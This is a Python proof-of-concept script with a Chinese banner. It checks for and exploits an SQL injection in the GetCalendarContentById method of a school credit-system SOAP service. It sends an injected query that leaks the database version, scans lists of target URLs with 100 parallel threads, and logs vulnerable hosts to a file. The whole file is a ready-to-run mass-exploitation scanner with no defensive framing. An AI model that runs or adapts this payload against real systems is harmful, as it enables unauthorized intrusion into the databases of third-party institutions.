import requests,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()



def banner():
    banner = """
<<<<<<<<<<某学分制系统-GetCalendarContentById-SQL注入漏洞复现>>>>>>>>>>
"""
    print(banner)


def poc(target):
    url = target+"/WebService_PantoSchool.asmx"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0", "Content-Type": "text/xml; charset=utf-8", "Connection": "close"}


    data="<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\r\n  <soapenv:Header/>\r\n    <soapenv:Body>\r\n      <tem:GetCalendarContentById>\r\n        <!--type: string-->\r\n        <tem:ID>1' OR 1 IN (SELECT @@version) AND '1'='1</tem:ID>\r\n      </tem:GetCalendarContentById>\r\n    </soapenv:Body>\r\n</soapenv:Envelope>\r\n\r\n\r\n"
    try:
        res = requests.post(data=data,url=url,headers=headers,verify=False,timeout=10)
        if  res.status_code == 500 and 'Microsoft SQL Server' in res.text :
                print(f'[+] 该url{target}存在SQL注入漏洞')
                with open('success.txt', 'a', encoding='utf-8') as f:
                    f.write(target + '\n')
        else:
            print(f'[-] 该站点{target}不存在SQL注入漏洞')
    except Exception as e:
        print(f"[*] 该url出现错误:{target}")


def main():

    banner()
    parser = argparse.ArgumentParser(description="this is a testing tool")
    parser.add_argument('-u','--url',dest='url',type=str,help='please input your attack-url')
    parser.add_argument('-f','--file',dest='file',type=str,help='please input your attack-url.txt')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == "__main__":
    main()